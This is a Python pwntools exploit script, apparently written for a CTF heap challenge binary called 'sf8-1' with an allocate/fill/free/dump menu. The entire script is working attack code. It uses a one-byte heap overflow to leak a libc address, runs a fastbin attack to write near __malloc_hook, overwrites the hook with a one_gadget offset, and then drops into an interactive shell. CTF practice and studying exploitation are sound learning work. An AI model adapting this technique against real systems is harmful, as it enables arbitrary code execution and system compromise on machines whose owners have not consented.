from pwn import *

p = process("./sf8-1")
# elf = 

context.log_level = 'debug'

one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

def allocate(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Allocate Index ")
    index = int(p.recvline().strip())
    return index

def fill(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def free(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))    

def dump(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Content: \n")

alloc_0 = allocate(0x18)
alloc_1 = allocate(0x80)  #mm
alloc_2 = allocate(0x10)
alloc_3 = allocate(0x60)
free(alloc_1)
# input()

fill(alloc_0, 0x19, b'A'*0x18 + b'\x93')

alloc_1 = allocate(0x80)
# input()
dump(alloc_1)  # fd out

leak = u64(p.recv(8))
print(hex(leak))
malloc_hook = leak - 0x68
libc_base = leak - 0x3c4b78

print(hex(libc_base))

#------------------------

free(3)

pay = b''
pay += p64(0)*3 + p64(0x71) 
pay += p64(malloc_hook - 0x30 + 0x8 + 0x5) # -> 7f 

fill(alloc_2, 0x28, pay)

input("1")

alloc_3 = allocate(0x60)
alloc_4 = allocate(0x60)

pay = b''
pay += b'\x00'*0x13
pay += p64(libc_base + one[0])

fill(alloc_4, 0x29, pay)

print(hex(malloc_hook))

# alloc(0x10)

input()

p.interactive()
